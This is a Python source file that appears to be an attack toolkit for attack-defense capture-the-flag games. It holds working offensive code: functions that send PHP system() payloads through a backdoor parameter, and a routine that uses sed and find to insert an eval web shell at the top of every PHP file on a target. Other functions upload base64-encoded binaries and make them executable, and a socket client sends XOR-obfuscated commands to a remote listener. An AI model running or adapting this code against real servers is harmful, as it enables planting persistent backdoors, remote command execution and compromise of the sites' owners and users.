import requests
import paramiko as sshc
import time
import base64
from utfc.sshFunc import SSH
'''
看起来很随机的2000个8位字符串，可以用来生成文件名或连接key
'''
rand8 = []



from threading import Thread
class urlTage:
    url = ""
    key = ""

    def __init__(self, url, key, dat={}):
        self.url = url
        self.dat = dat
        if '?' not in self.url:
            self.url += '?'
        if 'http' not in self.url:
            self.url = "http://" + self.url
        self.key = key

    def get(self, pl='system("ls");',mt=False):
        class mt_g(Thread):
            def __init__(self, url):
                self.url = url
            ret = ''
            def run(self):
                try:
                    ret = requests.get(self.url)
                    self.ret = ret.text
                except:
                    pass
        if mt :
            try:
                mt_g(self.url + '&' + self.key + '=' + pl).start()
                return "[001][Thread_Started]\n"
            except :
                return '[000][    0    ]\n'
        try:
            rec = requests.get(self.url + '&' + self.key + '=' + pl)
            print('[+]GET :' + pl)
            return '[%3s][%s]\n' % (rec.status_code, str(len(rec.text)).center(9)) + rec.text
        except:
            return '[000][    0    ]\n'

    def post(self, pl='system("ls");', dat=None,mt=False):
        if dat == None:
            dat = self.dat
        dat[self.key] = pl
        class mt_p(Thread):
            def __init__(self, url, data={}):
                self.url = url
                self.data = data
            ret = ''
            def run(self):
                try:
                    ret = requests.post(self.url, data=self.data)
                    self.ret = ret.text
                except:pass
        if mt :
            try:
                mt_p(self.url, data=dat).start()
                return "[001][Thread_Started]\n"
            except :
                return '[000][    0    ]\n'
        try:
            rec = requests.post(self.url, data=dat)
            print('[+]POST:' + pl)
            return '[%3d][%s]\n' % (rec.status_code, str(len(rec.text)).center(9)) + rec.text
        except:
            return '[000][    0    ]\n'

    def runFind(self, pl='cat {}', path='../', needSystem=True, filename='*.php'):
        pl = '''find {} -name "{}" -exec  {} \\;'''.format(path, filename, pl)  # find 执行命令 必须以 \; 结尾
        if needSystem:
            pl = "system('{}');".format(pl)
        print('[GET]' + self.get(pl)[:80].replace('\n', '__'))
        print('[POST]' + self.post(pl)[:80].replace('\n', '__'))

    def addHead(self, pl='''<?php  @eval(\\$_POST[\\"fucker\\"]); ?>''', path='../', needSystem=True,
                filename='*.php'):
        pl = 'sed -i  "1i {} "'.format(pl) + ' {}'
        self.runFind(pl, path, needSystem, filename)

    def putfile(self, pf=b'', fn='/tmp/up', cmd='echo "{}"|base64 -d >> {}'):
        b64 = base64.b64encode(pf).decode()
        pl = f"system('{cmd.format(b64, fn)}');"
        print('[GET]' + self.get(pl)[:80].replace('\n', '__'))
        print('[POST]' + self.post(pl)[:80].replace('\n', '__'))
        self.post("system('chmod 777 '+fn);");
        self.get("system('chmod 777 '+fn);");

    def postFile_phpw(self, fn, fnd='/tmp/DASCTF'):
        with open(fn, 'rb') as f:
            b64s = base64.b64encode(f.read()).decode()
        pl = {
            self.key: f'''$b="{b64s}";$c = base64_decode($b);$f = fopen("{fnd}",'w+');fwrite($f,$c);fclose($f);system("chmod 777 {fnd}");'''}
        requests.post(self.url, data=pl)



import socket

'''   
    while True:
        cmd =''.join([chr(ord(i)^0xF) for i in  input("CMD:")+' 2>&1'])
        s = awdf.socketSend('192.18.1.4',cmd,port=12368)
        print(s)
'''


def socketSend(ip, cmd='ls', port=12366, onlyChar=True, decoder='utf-8'):
    ret = b''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        if isinstance(cmd, str):
            cmd = cmd.encode()
        s.send(cmd)
        line = s.recv(4096)
        while len(line) > 1:
            ret += line
            line = s.recv(4096)
        s.close()
    except:
        print(f'[-]{ip}:{port} ERROR')
        return f'[-]{ip}:{port} ERROR'
    if onlyChar:
        ret = ret[:ret.find(0)]
        try:
            ret = ret.decode(decoder)
        except:
            pass

    print(f'[+]{ip}:{port} RECIVED<-{len(ret)}')
    return ret



